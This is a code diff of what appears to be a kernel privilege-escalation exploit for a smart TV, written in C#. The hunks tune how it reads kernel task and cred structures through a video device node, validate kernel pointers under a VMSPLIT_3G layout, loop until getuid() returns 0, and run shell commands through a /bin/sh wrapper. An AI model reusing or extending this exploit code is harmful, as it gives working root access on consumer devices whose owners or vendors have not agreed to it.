@@ -356,7 +356,7 @@ internal static class Program
         var sw = System.Diagnostics.Stopwatch.StartNew();
         int idx = 0;
         int lastIdx = -1, lastErr = -1;
-        long lastWaitBeacon = -30000;
+        long lastWaitBeacon = 0;   // first "still waiting" line at 30 s, not at 1 s
         while (sw.ElapsedMilliseconds < budgetMs)
         {
             string n = Nodes[idx];
@@ -460,12 +460,15 @@ internal static class Program
         }
     }
 
-    // LPAE direct map on this TV spans 0xC0000000..0xFFFFFFFF (1 GB).  Accept the
-    // full 32-bit direct map for POINTER SHAPE (trap 5), but do not expect to READ
-    // the high half reliably: the v31 cold boot showed every coherent read below
-    // 0xE0000000, 0/21 creds at/above it ever read 5001, and 0/81 successful task
-    // pointers were high.  A high task/cred needs a fresh process (allocation
-    // re-roll), not more time.  This bound is not a validity test.
+    // VMSPLIT_3G, not LPAE (the kernel .config has CONFIG_ARM_LPAE unset,
+    // CONFIG_VMSPLIT_3G=y, CONFIG_HIGHMEM=y, PAGE_OFFSET=0xC0000000).  The linear
+    // map covers lowmem only - at most 512 MiB of physical here, so it ends at VA
+    // 0xE0000000; everything above that is vmalloc/module space and `v - 0xA0000000`
+    // is NOT a valid translation there.  Accept the full 32-bit kernel range for
+    // POINTER SHAPE (trap 5), but do not expect to READ a task/cred above
+    // 0xE0000000: the v31 cold boot showed every coherent read below it (0/21
+    // creds, 0/81 task pointers high).  A high value is a garbage read, not a
+    // high allocation that needs more time.
     static bool Kptr(uint v) => v >= 0xC0000000;
 
     // 5001 = our uid, 0 = already root, 0xFFFFFFFF = not a readable cred
@@ -1241,9 +1244,13 @@ internal static class Program
             // the channel until the TV was power-cycled).  The command is passed
             // as an ARGUMENT ($2), never spliced into the -c string, so `}`, `;`
             // or quotes in it cannot break the wrapper.
+            // `ulimit -f 2048` caps the redirect file at ~1-2 MiB (512/1024-byte
+            // blocks depending on the shell): the 1 MiB read cap below bounded
+            // only what WE read, while /tmp is tmpfs, so `yes` could fill RAM
+            // until the 120 s kill (review P2, 2026-10-26).
             var psi = new System.Diagnostics.ProcessStartInfo("/bin/sh");
             psi.ArgumentList.Add("-c");
-            psi.ArgumentList.Add("exec > \"$1\" 2>&1; exec /bin/sh -c \"$2\"");
+            psi.ArgumentList.Add("exec > \"$1\" 2>&1; ulimit -f 2048 2>/dev/null; exec /bin/sh -c \"$2\"");
             psi.ArgumentList.Add("_");       // $0
             psi.ArgumentList.Add(outf);      // $1
             psi.ArgumentList.Add(cmd);       // $2
@@ -1347,7 +1354,8 @@ internal static class Program
             {
                 // Without the device every read fails; burning the rounds would
                 // only delay the fresh-process relaunch that can fix it.
-                Beacon("fail reopen video40 errno=" + _openErrno + " (exiting for a fresh process)");
+                Beacon("fail reopen " + _node + " errno=" + _openErrno +
+                       " (exiting for a fresh process)");
                 CloseDevice();
                 Thread.Sleep(5000);
                 return;
@@ -1732,7 +1740,7 @@ internal static class Program
                 // comms are coherent the direct-parent path works anyway), so
                 // fast mode spends less time here.
                 int scanTries = fastMode ? 2 : 20;
-            for (int t = 0; t < scanTries && getuid() != 0; t++)
+                for (int t = 0; t < scanTries && getuid() != 0; t++)
                 {
                     uint parent = 0;
                     try
